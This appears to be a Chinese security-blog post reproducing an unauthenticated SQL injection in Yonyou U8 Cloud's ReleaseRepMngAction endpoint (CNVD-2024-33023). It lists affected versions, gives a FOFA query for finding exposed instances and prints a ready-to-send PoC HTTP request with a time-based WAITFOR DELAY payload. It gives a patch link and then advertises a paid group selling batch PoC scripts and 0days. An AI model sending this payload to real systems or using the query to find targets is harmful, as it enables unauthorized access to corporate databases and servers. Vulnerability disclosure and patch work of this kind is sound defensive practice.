#  「漏洞复现」用友U8 Cloud ReleaseRepMngAction SQL注入漏洞复现(CNVD-2024-33023)   
冷漠安全  冷漠安全   2024-12-31 09:53  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
用友U8 Cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。是基于全新的企业互联网理念设计的云ERP系统，它旨在为企业提供集人财物客产供销于一体的云ERP整体解决方案，推动企业敏经营、轻管理、简IT，助力企业实现高速发展与云化创新。  
  
0x03  
  
漏洞威胁  
  
用友U8 Cloud ReleaseRepMngAction 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
影响范围：  
  
version = 1.0,2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,3.6sp,5.0,5.0sp  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
title=="U8C"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qDp3HNpKibfhW44gd298X8GN5Jux8nlc1Ksy1lkOFibYjVfib4NTmo0iaqxYEibWLFyeNZeAFKxN0pIoA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.ReleaseRepMngAction&method=updateDelFlag&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```  
  
延时  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qDp3HNpKibfhW44gd298X8GicOBoNlq1v8MRE7oibiatzLicjqJXRAMkKhWS1CtB0vnxUurIrLStQ1CBQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qDp3HNpKibfhW44gd298X8GFtxKXpf4x3niczFXdqgdia0xqPRJ9zOibF3pqwfFgmYWryl72LAMuIIJQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
升级补丁  
```
https://security.yonyou.com/#/noticeInfo?id=573
```  
  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qDp3HNpKibfhW44gd298X8GFauPQdWVY9WEiaXK2wGiaDGmqwe0mRZhs5d0lhKpwd9mT7LWfznLFjsw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qDp3HNpKibfhW44gd298X8GgGD2GY7ql7XRLHx350GoGkia5lCQh2SUkJy11cPb9L8Lia6W96pX025g/640?wx_fmt=gif&from=appmsg "")  
  
  
